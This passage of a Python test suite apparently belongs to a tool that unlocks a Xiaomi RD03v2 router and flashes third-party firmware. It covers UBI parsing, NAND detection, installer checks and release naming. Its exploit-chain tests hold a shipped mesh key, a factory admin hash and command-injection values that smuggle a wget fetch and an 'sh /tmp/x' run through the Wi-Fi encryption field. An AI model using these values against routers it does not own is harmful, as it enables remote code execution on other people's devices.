        rec[12] = vol_type
        rec[14:16] = struct.pack(">H", len(name))
        rec[16:16 + len(name)] = name.encode()
        off = vol_id * ubiparse.VTBL_RECORD
        vtbl[off:off + ubiparse.VTBL_RECORD] = rec
    for _ in range(2):
        pebs.append(peb(vid_hdr(ubiparse.LAYOUT_VOL_ID, len(pebs) % 2, 1, 0, 0),
                        bytes(vtbl)))

    # stale copies first, so physical order and sqnum order disagree
    for vol_id, lnum, payload in (stale or []):
        pebs.append(peb(vid_hdr(vol_id, lnum, 1, len(payload), 1, sqnum=10),
                        payload))
    for vol_id, name, vol_type, payload in volumes:
        chunks = [payload[i:i + leb] for i in range(0, len(payload), leb)] or [b""]
        for lnum, chunk in enumerate(chunks):
            pebs.append(peb(vid_hdr(vol_id, lnum, vol_type, len(chunk), len(chunks),
                                    sqnum=1000 + lnum), chunk))
    pebs.append(peb(None, b""))          # erased-and-counted block
    pebs.append(b"\xff" * peb_size)      # never-used block
    return b"".join(pebs)


def test_ubi():
    print("\n== ubi parser ==")
    fit = bytes.fromhex("d00dfeed") + os.urandom(300000)
    other = bytes.fromhex("d00dfeed") + os.urandom(120000)
    img_bytes = _mk_ubi(volumes=[
        (0, "kernel", 2, fit),
        (1, "kernel1", 2, other),
    ])
    img = ubiparse.UbiImage(img_bytes)
    check("peb size detected", img.peb_size == 131072, str(img.peb_size))
    names = sorted(v.name for v in img.volumes.values())
    check("both volumes enumerated", names == ["kernel", "kernel1"], str(names))
    check("static payload is byte-exact", img.extract(0) == fit,
          f"{len(img.extract(0))} vs {len(fit)}")
    check("second volume is byte-exact", img.extract(1) == other)
    check("FIT magic survives", img.extract(0)[:4] == bytes.fromhex("d00dfeed"))
    check("erased blocks counted", img.empty_pebs >= 1, str(img.empty_pebs))
    check("report renders", "kernel1" in img.report())

    single = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "kernel", 2, fit)]))
    check("single-volume image parses",
          [v.name for v in single.volumes.values()] == ["kernel"])

    dyn = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "rootfs", 1, os.urandom(500000))]))
    check("dynamic volume enumerated",
          dyn.volumes[0].type_name == "dynamic", dyn.volumes[0].type_name)


# ---- 4. parsers used for the verdicts ---------------------------------------


PROC_MTD = """dev:    size   erasesize  name
mtd0: 00080000 00020000 "0:SBL1"
mtd10: 00080000 00020000 "0:APPSBLENV"
mtd11: 00140000 00020000 "0:APPSBL"
mtd14: 00100000 00020000 "0:ART"
mtd17: 02400000 00020000 "ubi_kernel"
mtd18: 05180000 00020000 "rootfs"
"""


def test_ubi_live_hazards():
    """The two things that bite when parsing a dump off live flash."""
    print("\n== ubi parser: live-flash hazards ==")
    old, new = b"OLD" + os.urandom(2000), b"NEW" + os.urandom(2000)
    # same lnum written twice: the higher sqnum is the current one, and it is
    # deliberately placed EARLIER in the image so physical order picks wrong
    img = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "kernel", 1, new)],
                                    stale=[(0, 0, old)]))
    got = img.extract(0)[:3]
    check("newest LEB wins by sqnum, not by position", got == b"NEW", str(got))

    a = _mk_ubi(volumes=[(0, "kernel", 1, os.urandom(1000))], image_seq=0x11111111)
    b = _mk_ubi(volumes=[(0, "kernel", 1, os.urandom(1000))], image_seq=0x22222222)
    merged = ubiparse.UbiImage(a + b)
    check("two adjacent UBIs are detected", len(merged.image_seqs) == 2,
          str(sorted(merged.image_seqs)))
    check("and the report says so loudly",
          "DISTINCT image_seq" in merged.report())
    single = ubiparse.UbiImage(a)
    check("a single UBI is not flagged", "DISTINCT" not in single.report())


def test_readback_match():
    print("\n== read-back comparison ==")
    image = bytes.fromhex("d00dfeed") + os.urandom(1000)
    leb = 126976
    padded = image + b"\xff" * (leb - len(image))
    ok, why = ubiparse.matches_image(padded, image)
    check("0xff-padded volume matches its image", ok, why)
    ok, why = ubiparse.matches_image(image, image)
    check("exact-length volume matches", ok, why)
    ok, why = ubiparse.matches_image(image[:-1], image)
    check("short volume is rejected", not ok, why)
    bad = bytearray(padded)
    bad[500] ^= 0xFF
    ok, why = ubiparse.matches_image(bytes(bad), image)
    check("a flipped byte is caught with its offset",
          not ok and "offset 500" in why, why)
    bad2 = bytearray(padded)
    bad2[len(image) + 10] = 0x00
    ok, why = ubiparse.matches_image(bytes(bad2), image)
    check("dirty padding is rejected", not ok, why)


def test_real_artifact():
    """Optional: parse a genuine release artifact if one has been fetched.

        RD03V2_IMAGES=/path/to/images python3 selftest.py
    """
    d = os.environ.get("RD03V2_IMAGES")
    if not d or not os.path.isdir(d):
        return
    print("\n== real release artifact ==")
    import glob
    # Releases ship four initramfs flavours (default, -nss, -wifi, -nss-wifi), so
    # match the family rather than one exact name: `release.py --download --wifi`
    # fetches the -wifi pair, which the old exact-name globs missed.
    ubis = sorted(glob.glob(os.path.join(d, "*initramfs-factory*.ubi")))
    itbs = sorted(glob.glob(os.path.join(d, "*initramfs-uImage*.itb")))
    if not ubis:
        check("artifacts present", False, f"no *initramfs-factory*.ubi in {d}")
        return
    if not itbs:
        # The .ubi alone still exercises the parser; only the wrapped-kernel
        # comparison needs the .itb, so skip that rather than fail the run.
        print(f"  [skip] no *initramfs-uImage*.itb in {d} -- fetching the .ubi "
              f"(and the sysupgrade) is enough to install; the .itb is only used "
              f"to check that the UBI wraps it")
        itbs = None
    img = ubiparse.UbiImage(open(ubis[0], "rb").read())
    names = [v.name for v in img.volumes.values()]
    check("real ubinize image parses", names == ["kernel"], str(names))
    check("peb size read from a real image", img.peb_size == 131072,
          str(img.peb_size))
    vol = img.extract(0)
    check("kernel volume is a FIT", vol[:4] == bytes.fromhex("d00dfeed"))
    if itbs:
        ok, why = ubiparse.matches_image(vol, open(itbs[0], "rb").read())
        check("volume read-back matches the .itb it wraps", ok, why)


def test_parsers():
    print("\n== verdict parsers ==")
    m = probe.parse_proc_mtd(PROC_MTD)
    check("mtd map parsed", len(m) == 6, str(sorted(m)))
    check("ubi_kernel index/size", m["ubi_kernel"] == (17, 0x02400000, 0x20000),
          str(m.get("ubi_kernel")))
    check("names with colons survive", "0:APPSBLENV" in m)

    esmt = probe.identify_nand(
        "[    0.9] spi-nand: ESMT SPI NAND was found.\n"
        "[    0.9] Serial NAND device Manufacturer:F50D1G41LB Device Size:128 MiB")
    check("ESMT identified", any("ESMT F50D1G41LB" == h["part"] for h in esmt),
          str([h["part"] for h in esmt]))

    wb = probe.identify_nand(
        "[    0.9] Serial NAND device Manufacturer:W25N01KWZEIG\n"
        "[    0.9] Device Size:128 MiB, Page size:2048, Spare Size:64, ECC:4-bit")
    check("Winbond identified", any("W25N01KW" in h["part"] for h in wb),
          str([h["part"] for h in wb]))
    check("Winbond flagged as unsupported by v1.6",
          any("v1.6" in h["note"] for h in wb))

    raw = probe.identify_nand("spi-nand spi0.0: unknown raw ID efbe210000")
    check("raw winbond id identified", any("W25N01KW" in h["part"] for h in raw),
          str([h["part"] for h in raw]))

    check("unknown chip yields no false positive",
          probe.identify_nand("nand: device found, Manufacturer ID: 0x2c") == [])


# ---- 5. the exploit constants and the web API flow --------------------------


def test_protocol():
    print("\n== mesh protocol ==")
    # cab_meshd's own debug log prints the incoming peer's key as
    # "q38d364d..." -- i.e. the 'q' role byte replacing the first nibble pair
    # of the constant. If this ever stops matching, the handshake is wrong and
    # the one-shot would be spent on a failed auth.
    key = b"q" + chain.MESH_KEY[1:]
    check("q-variant key matches the daemon's log",
          key == b"q38d364d8ed3bd085e150211ea6b3715", key.decode())
    check("mesh key length", len(chain.MESH_KEY) == 32)

    p = chain._q_pass(b"ota0001")
    expect = base64.b64encode(
        hmac.new(key, b"ota0001", hashlib.sha256).digest())
    check("auth is base64(HMAC-SHA256(key, id))", p == expect)
    check("auth fits the type-4 pass slot at 0x10", len(p) == 44, str(len(p)))

    h = chain._hdr(4, 0xA4)
    check("header is 0x2c bytes", len(h) == chain.MESH_HDR)
    check("header carries ver/len/type",
          struct.unpack(">HHH", h[0:6]) == (0x1001, 0xA4, 4),
          str(struct.unpack(">HHH", h[0:6])))

    check("factory account hash is the shipped one",
          chain.FACTORY_ADMIN_HASH.startswith("73a1d6d0")
          and chain.FACTORY_ADMIN_HASH.endswith("fa8cdfa24")
          and len(chain.FACTORY_ADMIN_HASH) == 64)

    nonce = chain.make_nonce("aa:bb:cc:dd:ee:ff")
    check("nonce has the four fields checkNonce wants",
          len(nonce.split("_")) == 4 and nonce.startswith("0_"), nonce)


class _MiWiFi(http.server.BaseHTTPRequestHandler):
    """Just enough of the stock web API to exercise the client side."""

    state = {}

    def log_message(self, *a):
        pass

    def _json(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._route({})

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n).decode()
        self._route({k: v[0] for k, v in urllib.parse.parse_qs(raw).items()})

    def _route(self, form):
        st = type(self).state
        path = self.path
        if path.endswith("api/xqsystem/init_info"):
            return self._json({"hardware": "RD03v2", "romversion": "2.0.28",
                               "inited": st["inited"], "newEncryptMode": 1,
                               "routername": "XiaoQiang",
                               "model": "xiaomi.router.rd03v2"})
        if path.endswith("api/xqsystem/login"):
            want = hashlib.sha256(
                (form.get("nonce", "") + st["account"]).encode()).hexdigest()
            if form.get("password") != want:
                return self._json({"code": 401, "msg": "bad password"})
            st["stok"] = "deadbeef" * 4
            return self._json({"code": 0, "token": st["stok"]})
        if f";stok={st.get('stok')}/" not in path:
            return self._json({"code": 401, "msg": "no session"})
        if path.endswith("api/xqsystem/router_init"):
            st["inited"] = 1
            st["ssid"] = form.get("wifi24Ssid", "")
            return self._json({"code": 0})
        if path.endswith("api/xqnetwork/get_netmode"):
            return self._json({"code": 0, "netmode": st.get("netmode", 0)})
        if path.endswith("api/xqnetwork/wifi_detail_all"):
            return self._json({"code": 0, "info": st["bands"]})
        if path.endswith("api/xqnetwork/set_wifi_without_restart"):
            idx = int(form.get("wifiIndex", "1")) - 1
            enc = form.get("encryption", "")
            # `sanitize` models a firmware where `encryption` is no longer on
            # hackCheck's exemption list -- the payload needs `"` and would be
            # dropped. That is the case plant() has to catch, because firing
            # the trigger afterwards spends the one-shot on nothing.
            if st.get("sanitize") and '"' in enc:
                return self._json({"code": 1587, "msg": "参数错误"})
            st["bands"][idx]["encryption"] = enc
            st["bands"][idx]["ssid"] = form.get("ssid", "")
            st["bands"][idx]["password"] = form.get("pwd", "")
            return self._json({"code": 0})
        return self._json({"code": 404})


def test_http_flow():
    print("\n== web api flow ==")
    _MiWiFi.state = {
        "inited": 0,
        "account": chain.FACTORY_ADMIN_HASH,
        "bands": [
            {"ifname": "wl0", "ssid": "Xiaomi_ABCD", "encryption": "none",
             "password": "", "channelInfo": {"channel": 6}},
            {"ifname": "wl1", "ssid": "Xiaomi_ABCD_5G", "encryption": "none",
             "password": "", "channelInfo": {"channel": 44}},
        ],
    }
    srv = socketserver.TCPServer(("127.0.0.1", 0), _MiWiFi)
    host = f"127.0.0.1:{srv.server_address[1]}"
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        info = chain.init_info(host)
        check("init_info round-trips", info["hardware"] == "RD03v2")

        chain.initialise(host, reboot=False)
        check("router_init flips inited", _MiWiFi.state["inited"] == 1)
        check("router_init submitted the SSID only",
              _MiWiFi.state["ssid"] == "XiaoQiang")

        stok = chain.login(host, chain.FACTORY_ADMIN_HASH)
        check("login derives sha256(nonce||stored)", stok == "deadbeef" * 4)

        check("gate-open CAP state accepted",
              chain.require_cap_sink_ready(host, stok) == 0)
        _MiWiFi.state["netmode"] = 4
        try:
            chain.require_cap_sink_ready(host, stok)
            check("normal wizard CAP state refused", False)
        except chain.ChainError as e:
            check("normal wizard CAP state refused",
                  "factory-reset" in str(e).lower())
        _MiWiFi.state["netmode"] = 0

        try:
            chain.login(host, "0" * 64)
            check("wrong hash is rejected", False)
        except chain.ChainError:
            check("wrong hash is rejected", True)

        bands = chain.read_wifi(host, stok)
        check("radio config captured before the plant",
              [b["ssid"] for b in bands] == ["Xiaomi_ABCD", "Xiaomi_ABCD_5G"],
              str(bands))
        check("open AP reported as such", bands[0]["encryption"] == "none")

        chain.plant(host, stok, "192.0.2.2", 8000, bands)
        enc24 = _MiWiFi.state["bands"][0]["encryption"]
        enc5 = _MiWiFi.state["bands"][1]["encryption"]
        check("2.4G carries the fetch stage",
              enc24 == '\\" wget http://192.0.2.2:8000/s -O /tmp/x #', enc24)
        check("5G carries the exec stage", enc5 == '\\" sh /tmp/x #', enc5)
        check("SSIDs preserved through the plant",
              _MiWiFi.state["bands"][0]["ssid"] == "Xiaomi_ABCD")
        check("no hackCheck-blacklisted byte in either payload",
              not any(c in enc24 + enc5 for c in ";|$&`"))

        # if the web layer ever did filter these, plant() must refuse rather
        # than let the caller burn the one-shot on a payload that is not there
        _MiWiFi.state["sanitize"] = True
        _MiWiFi.state["bands"][0]["encryption"] = "none"
        _MiWiFi.state["bands"][1]["encryption"] = "none"
        try:
            chain.plant(host, stok, "192.0.2.2", 8000, bands)
            check("a filtered plant aborts before the trigger", False)
        except chain.ChainError as e:
            check("a filtered plant aborts before the trigger",
                  "read-back" in str(e), str(e)[:60])
    finally:
        srv.shutdown()


# ---- 6. the probe battery itself --------------------------------------------


def test_facts_commands():
    """Every FACTS command must be valid BusyBox ash and must terminate.

    A syntax error in one of these would be discovered on the router, in the
    middle of the only shot at it. Running them against the local busybox
    proves the shell accepts them; the output is this machine's, not a
    router's, which is fine -- shape is what is under test.
    """
    print("\n== probe battery ==")
    if not shutil.which("busybox"):
        skip("probe command syntax", "BusyBox is not installed")
        return
    for key, _desc, cmd in probe.FACTS:
        # a newline inside a command would be read as its own shell line and
        # desynchronise the marker framing
        check(f"{key}: single line", "\n" not in cmd)
        r = subprocess.run(["busybox", "ash", "-c", cmd],
                           capture_output=True, text=True, timeout=30)
        bad = [ln for ln in r.stderr.splitlines()
               if "syntax error" in ln or "unexpected" in ln]
        check(f"{key}: runs under ash", not bad, "; ".join(bad[:2]))


class _FakeSink:
    def __init__(self):
        self.q = []

    def wait(self, timeout=0):
        return self.q.pop(0) if self.q else (None, None, 0, 0)


class _FakeChannel:
    """Answers pull()'s reader commands the way a device with no nanddump
    and a working dd would."""

    def __init__(self, sink, outdir, size):
        self.sink, self.outdir, self.size = sink, outdir, size
        self.cmds = []

    def run(self, cmd, timeout=0, retries=0, quiet=False):
        self.cmds.append(cmd)
        path = os.path.join(self.outdir, "ubi_kernel.bin")
        if "nanddump" in cmd:
            open(path, "wb").write(b"")                 # applet missing
            self.sink.q.append(("ubi_kernel.bin", path, 0, self.size))
        elif "dd if=" in cmd:
            open(path, "wb").write(b"\xa5" * self.size)
            self.sink.q.append(("ubi_kernel.bin", path, self.size, self.size))
        return 0, ""


def test_pull_fallback():
    outdir = tempfile.mkdtemp(prefix="rd03v2-pull-")
    try:
        size = 4096
        sink = _FakeSink()
        ch = _FakeChannel(sink, outdir, size)
        got = probe.pull(ch, sink, outdir, {"ubi_kernel": (17, size, 131072)},
                         "ubi_kernel", ["ubi_kernel"], "10.0.0.1", 4445,
                         "testtoken")
        check("falls back past a missing nanddump", got is not None
              and got["reader"] == "dd", str(got and got["reader"]))
        check("records the partition it read", got and got["partition"] == "ubi_kernel")
        check("hashes what it received",
              got and got["sha256"] == hashlib.sha256(b"\xa5" * size).hexdigest())

        missing = probe.pull(ch, sink, outdir, {"rootfs": (18, 10, 1)},
                             "appsbl", ["0:APPSBL"], "10.0.0.1", 4445,
                             "testtoken")
        check("absent partition is skipped, not guessed", missing is None)
        session = probe.write_session_manifest(
            outdir, "10.0.0.1", "10.0.0.2", 8000, 4444, 4445,
            "persisted-token")
        saved = json.load(open(session))
        check("probe persists private attachment token",
              saved["session_token"] == "persisted-token"
              and (os.stat(session).st_mode & 0o777) == 0o600)
    finally:
        shutil.rmtree(outdir, ignore_errors=True)


# ---- 7. the installer's pre-flight, replayed against real device output -----

# Verbatim from a live RD03v2 on stock 2.0.28 (probe-20260814-074535).
REAL_MTD = """dev:    size   erasesize  name
mtd0: 00080000 00020000 "0:SBL1"
mtd1: 00080000 00020000 "0:MIBIB"
mtd10: 00080000 00020000 "0:APPSBLENV"
mtd11: 00140000 00020000 "0:APPSBL"
mtd13: 00100000 00020000 "0:ART"
mtd15: 00080000 00020000 "bdata"
mtd18: 01e00000 00020000 "rootfs"
mtd19: 01e00000 00020000 "rootfs_1"
mtd20: 03980000 00020000 "overlay"
mtd21: 00383000 0001f000 "kernel"
mtd22: 0120b000 0001f000 "ubi_rootfs"
"""
REAL_CMDLINE = ("ubi.mtd=rootfs root=mtd:ubi_rootfs rootfstype=squashfs "
                "cnss2.bdf_integrated=0x24 rootwait swiotlb=1")


class _ReplayShell:
    """Answers the exact commands preflight() issues, with real values."""

    def __init__(self, **over):
        self.v = {
            "model": "RD03v2", "flash_type": "11", "flag_boot_rootfs": "0",
            "mtd": REAL_MTD, "cmdline": REAL_CMDLINE,
            "ubi": "ubi0 18\nubi1 20", "flag_last_success": "0",
            "df": "tmpfs                    93332      1216     92116   1% /tmp",
            "missing_tool": None,
        }
        self.v.update(over)

    def run(self, cmd, timeout=0, retries=0, quiet=False):
        if cmd.startswith("nvram get "):
            return 0, self.v.get(cmd.split()[-1], "")
        if "cat /proc/mtd" in cmd:
            return 0, self.v["mtd"]
        if "cat /proc/cmdline" in cmd:
            return 0, self.v["cmdline"]
        if "/sys/class/ubi" in cmd:
            return 0, self.v["ubi"]
        if cmd.startswith("df "):
            return 0, self.v["df"]
        if cmd.startswith("command -v "):
            tool = cmd.split()[2]
            return (1, "") if tool == self.v["missing_tool"] else (0, "")
        return 0, ""


def _fake_release(tag="v1.6"):
    return release.Release({"tag_name": tag, "published_at": "2026-08-02T00:00:00Z",
                            "assets": []})


def _fake_images(size=14680064):
    d = tempfile.mkdtemp(prefix="rd03v2-img-")
    p = os.path.join(d, "initramfs-factory.ubi")
    with open(p, "wb") as fh:
        fh.truncate(size)          # sparse: preflight only stats it
    return {"initramfs_ubi": {"name": "initramfs-factory.ubi", "path": p}}, d


def _preflight(shell, rel=None, images=None):
    import install
    imgs, d = (images, None) if images else _fake_images()
    try:
        return install.preflight(shell, rel or _fake_release(), imgs, True,
                                 devices.RD03V2), None
    except Exception as e:                                       # noqa: BLE001
        return None, e
    finally:
        if d:
            shutil.rmtree(d, ignore_errors=True)


def test_installer_preflight():
    import install
    print("\n== installer pre-flight (replaying the real unit) ==")

    m = install.parse_mtd(REAL_MTD)
    check("real /proc/mtd parses", m["rootfs_1"]["index"] == 19
          and m["rootfs"]["size"] == 0x01e00000, str(m.get("rootfs_1")))
    check("both slots are the same size",
          m["rootfs"]["size"] == m["rootfs_1"]["size"])

    facts, err = _preflight(_ReplayShell())
    check("real unit passes pre-flight", err is None, str(err))
    if facts:
        check("running slot read from cmdline", facts["running_slot"] == "rootfs")
        check("target is the idle slot", facts["target_slot"] == "rootfs_1",
              facts["target_slot"])
        check("NAND decoded from nvram flash_type",
              facts["nand"] == "ESMT F50D1G41LB", str(facts["nand"]))

    facts, err = _preflight(_ReplayShell(flash_type="be"))
    check("Winbond unit refused against v1.6",
          err is not None and "v1.7" in str(err), str(err)[:80])

    facts, err = _preflight(_ReplayShell(flash_type="be"), rel=_fake_release("v1.7"))
    check("Winbond unit accepted against v1.7", err is None, str(err)[:80])
    check("Winbond part name decoded",
          facts and facts["nand"] == "Winbond W25N01KW", str(facts and facts["nand"]))

    _f, err = _preflight(_ReplayShell(flash_type="77"))
    check("unknown flash_type fails closed",
          err is not None and "no release is known to drive it" in str(err),
          str(err)[:80])

    _f, err = _preflight(_ReplayShell(flash_type=""))
    check("absent flash_type fails closed",
          err is not None and "no flash_type" in str(err), str(err)[:80])

    _f, err = _preflight(_ReplayShell(model="RD23"))
    check("wrong model refused", err is not None and "RD03v2" in str(err))

    _f, err = _preflight(_ReplayShell(flag_boot_rootfs="1"))
    check("cmdline/flag_boot_rootfs disagreement refused",
          err is not None and "Refusing to guess" in str(err), str(err)[:80])

    # flag_last_success is the chooser's actual input, so a disagreement there
    # means the slot model is wrong -- must refuse just as hard.
    _f, err = _preflight(_ReplayShell(flag_last_success="1"))
    check("cmdline/flag_last_success disagreement refused",
          err is not None and "Refusing to guess" in str(err), str(err)[:80])

    facts, err = _preflight(_ReplayShell())
    check("flag_last_success recorded for the pivot",
          err is None and facts["flag_last_success"] == "0",
          str(facts and facts.get("flag_last_success")))

    _f, err = _preflight(_ReplayShell(ubi=""))
    check("unreadable ubi->mtd mapping fails closed",
          err is not None and "refusing to pick a target" in str(err), str(err)[:80])

    # the interlock that actually matters: never write the live partition
    _f, err = _preflight(_ReplayShell(ubi="ubi0 19\nubi1 20"))
    check("target attached at runtime is refused",
          err is not None and "not the idle slot" in str(err), str(err)[:80])

    big, d = _fake_images(size=0x01e00000 + 1)
    _f, err = _preflight(_ReplayShell(), images=big)
    shutil.rmtree(d, ignore_errors=True)
    check("oversized image refused", err is not None and "holds" in str(err),
          str(err)[:80])

    small, d = _fake_images()
    _f, err = _preflight(_ReplayShell(df="tmpfs 93332 1216 4096 96% /tmp"),
                         images=small)
    shutil.rmtree(d, ignore_errors=True)
    check("insufficient tmpfs refused", err is not None and "tmpfs" in str(err),
          str(err)[:80])

    _f, err = _preflight(_ReplayShell(missing_tool="ubiformat"))
    check("missing ubiformat refused", err is not None and "ubiformat" in str(err))

    # wrapped df line: BusyBox puts a long device name on its own line
    facts, err = _preflight(_ReplayShell(df="   93332  1216  92116   1% /tmp"))
    check("wrapped df line still parses", err is None, str(err)[:80])

    check("flash_type table covers both documented parts",
          devices.RD03V2.flash_types["11"] == "ESMT F50D1G41LB"
          and devices.RD03V2.flash_types["be"] == "Winbond W25N01KW")


# ---- 8. v1.7: the -wifi variants and the release's own NAND declaration -----

V17_ASSETS = [
    "initramfs-factory.ubi", "initramfs-factory-wifi.ubi",
    "initramfs-factory-nss.ubi", "initramfs-factory-nss-wifi.ubi",
    "initramfs-uImage.itb", "initramfs-uImage-wifi.itb",
    "initramfs-uImage-nss.itb", "initramfs-uImage-nss-wifi.itb",
    "squashfs-sysupgrade.bin", "squashfs-sysupgrade-nss.bin",
    "squashfs-factory.ubi", "squashfs-factory-nss.ubi",
    "kmods.tar.gz", "kmods-nss.tar.gz",
]


def _v17_release(with_nand_file=True):
    """A v1.7 Release whose asset names are the ones actually published."""
    assets = [{"name": f"{devices.RD03V2.release_prefix}-{n}", "browser_download_url": "http://x/",
               "size": 1} for n in V17_ASSETS]
    assets.append({"name": "sha256sums.txt", "browser_download_url": "http://x/",
                   "size": 1})
    if with_nand_file:
        assets.append({
            "name": "nand-support.txt", "browser_download_url": "http://x/",
            "size": os.path.getsize(NAND_SUPPORT_FIXTURE)})
    return release.Release({"tag_name": "v1.7", "published_at": "2026-08-14T16:48:40Z",
                            "assets": assets})


def test_v17_names():
    print("\n== v1.7 asset naming ==")
    rel = _v17_release()
    cases = [
        ("initramfs_itb", "default", False, "initramfs-uImage.itb"),
        ("initramfs_itb", "default", True, "initramfs-uImage-wifi.itb"),
        ("initramfs_itb", "nss", False, "initramfs-uImage-nss.itb"),
        ("initramfs_itb", "nss", True, "initramfs-uImage-nss-wifi.itb"),
        ("initramfs_ubi", "nss", True, "initramfs-factory-nss-wifi.ubi"),
        ("sysupgrade", "nss", False, "squashfs-sysupgrade-nss.bin"),
    ]
    for kind, flav, wifi, tail in cases:
        got = rel.name_for(kind, flav, wifi)
        want = f"{devices.RD03V2.release_prefix}-{tail}"
        check(f"{kind}/{flav}{'/wifi' if wifi else ''} -> {tail}", got == want, got)
        # and it must be an asset that actually exists in the release
        check(f"  {tail} is published", got in rel.assets)

    try:
        rel.name_for("sysupgrade", "default", True)
        check("sysupgrade has no -wifi twin", False)
    except release.ReleaseError as e:
        check("sysupgrade has no -wifi twin", "no -wifi variant" in str(e))


def test_v2_names():
    print("\n== v2 asset naming: one image set for both selections ==")
    prefix = devices.RD03V2.release_prefix
    for tag in ("v2.0.0", "v2.0.0-rc1", "v2.1"):
        rel = release.Release({"tag_name": tag})
        check(f"{tag} is a v2 release", rel.is_v2)
        for flav in ("default", "nss"):
            check(f"{tag} {flav}: sysupgrade without -nss",
                  rel.name_for("sysupgrade", flav) == prefix + "-squashfs-sysupgrade.bin")
            check(f"{tag} {flav}: Wi-Fi RAM installer has only the wifi suffix",
                  rel.name_for("initramfs_ubi", flav, True) == prefix + "-initramfs-factory-wifi.ubi")
    for tag in ("v1.14", "v1.7", "v20.0"):
        rel = release.Release({"tag_name": tag})
        check(f"{tag} is not a v2 release", not rel.is_v2)
    check("a v1.x NSS selection keeps its -nss build",
          release.Release({"tag_name": "v1.14"}).name_for("sysupgrade", "nss")
          == prefix + "-squashfs-sysupgrade-nss.bin")
    import install
    args = install.parse_args(["nss", "--release", "v2.0.0", "--offline"])
    check("a v2 release installs from the nss selection, offline kept",
          args.flavour == "nss" and args.tag == "v2.0.0" and args.offline)
    args = install.parse_args(["standard", "--release", "v2.0.0"])
    check("a v2 release installs from the standard selection",
          args.flavour == "default" and args.tag == "v2.0.0")
    for argv in (["nss-v2"], ["--flavour", "v2"]):
        with mock.patch("sys.stderr"):
            try:
                install.parse_args(argv)
            except SystemExit as exc:
                check("no separate v2 selection: " + " ".join(argv), exc.code == 2)
            else:
                check("no separate v2 selection: " + " ".join(argv), False)


def test_v17_nand_support():
    print("\n== v1.7 nand-support.txt ==")
    d = tempfile.mkdtemp(prefix="rd03v2-nand-")
    try:
        rel = _v17_release()
        tagged = release.cache_dir(rel, d)
        os.makedirs(tagged)
        shutil.copy(NAND_SUPPORT_FIXTURE,
                    os.path.join(tagged, "nand-support.txt"))
        # download() short-circuits on a present file of the declared size, so
        # this parses the real published asset with no network.
        table = release.nand_support(rel, d)
        check("real nand-support.txt parses", isinstance(table, dict) and table,
              f"{len(table or {})} entries")
        check("only bootloader-identifiable parts are offered",
              len(table) == 12, str(len(table)))
        check("'-' rows are dropped", "-" not in table)
        check("ESMT keyed on its flash_type byte",
              "ESMT F50D1G41LB" in table.get("11", ""), table.get("11"))
        check("Winbond KW keyed on its flash_type byte",
              "W25N01KW" in table.get("be", ""), table.get("be"))

        ok, why = release.check_nand(rel, None, d, flash_type="be")
        check("v1.7 accepts a Winbond unit by flash_type", ok, why)
        ok, why = release.check_nand(rel, None, d, flash_type="0x11")
        check("0x-prefixed flash_type normalises", ok, why)
        ok, why = release.check_nand(rel, None, d, flash_type="77")
        check("an undeclared flash_type is refused", not ok, why[:70])
        ok, why = release.check_nand(rel, "ESMT F50D1G41LB", d)
        check("part-name fallback still works when no byte is known", ok, why)

        # the release, not the local version table, is the authority
        ok, why = release.check_nand(rel, "Winbond W25N01KW", d)
        check("release declaration outranks the local version table", ok, why)
        no_file = _v17_release(with_nand_file=False)
        ok, why = release.check_nand(no_file, "Winbond W25N01KW", d)
        check("without the asset it falls back to the version table",
              ok and "v1.7" in why, why[:60])
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_release_selection():
    print("\n== automatic release selection ==")
    profile = devices.RD03V2
    endpoint = f"repos/{profile.release_repo}/releases/"
    meta = {"tag_name": "v1.13", "assets": [], "draft": False,
            "prerelease": False}
    for tag in (None, "latest", "v1.13"):
        with mock.patch.object(release, "_api", return_value=meta) as api:
            rel = release.resolve(tag)
        suffix = "tags/v1.13" if tag == "v1.13" else "latest"
        check(f"release selection {tag!r} resolves to a concrete tag",
              rel.tag == "v1.13" and api.call_count == 1
              and api.call_args == mock.call(endpoint + suffix)
              and release.cache_dir(rel, "images") == "images/v1.13")

    stdout, stderr = io.StringIO(), io.StringIO()
    rate_limit = release.urllib.error.HTTPError("https://api.github.com/", 403,
                                               "rate limited", {}, None)
    gh_result = subprocess.CompletedProcess([], 0, json.dumps(meta), "")
    with mock.patch.object(release.urllib.request, "urlopen", side_effect=rate_limit), \
            mock.patch.object(release.shutil, "which", return_value="/usr/bin/gh"), \
            mock.patch.object(release.subprocess, "run", return_value=gh_result), \
            mock.patch.object(sys, "stdout", stdout), \
            mock.patch.object(sys, "stderr", stderr):
        print(release.resolve().tag)
    check("authenticated API fallback keeps a captured tag free of diagnostics",
          stdout.getvalue() == "v1.13\n" and "authenticated" in stderr.getvalue())

    for flag in ("draft", "prerelease"):
        with mock.patch.object(release, "_api", return_value={**meta, flag: True}):
            try:
                release.resolve()
                check(f"latest rejects a {flag} response", False)
            except release.ReleaseError as exc:
                check(f"latest rejects a {flag} response",
                      "published stable release" in str(exc))

    with mock.patch.object(release, "_api") as api, \
            mock.patch.object(release, "cache_dir") as cache:
        for tag in (None, "latest"):
            try:
                release.resolve(tag, offline=True)
                check(f"offline {tag!r} requires an explicit tag", False)
            except release.ReleaseError as exc:
                check(f"offline {tag!r} requires an explicit tag",
                      "explicit release tag" in str(exc))
        try:
            release.from_cache("latest")
            check("cache cannot represent an unresolved latest release", False)
        except release.ReleaseError:
            check("cache cannot represent an unresolved latest release", True)
        check("offline latest never queries GitHub or opens a cache",
              not api.called and not cache.called)

    pinned = release.Release(meta)
    with mock.patch.object(release, "_api") as api, \
            mock.patch.object(release, "from_cache", return_value=pinned) as cache:
        rel = release.resolve("v1.13", destdir="cache", offline=True)
        check("explicit offline selection uses only its tagged cache",
              rel is pinned and not api.called
              and cache.call_args == mock.call("v1.13", profile, "cache"))

    online_error = release.ReleaseError("GitHub unavailable")
    with mock.patch.object(release, "_api", side_effect=online_error), \
            mock.patch.object(release, "from_cache", return_value=pinned) as cache:
        try:
            release.resolve()
            check("latest API failure requires explicit cached selection", False)
        except release.ReleaseError as exc:
            check("latest API failure requires explicit cached selection",
                  "GitHub unavailable" in str(exc)
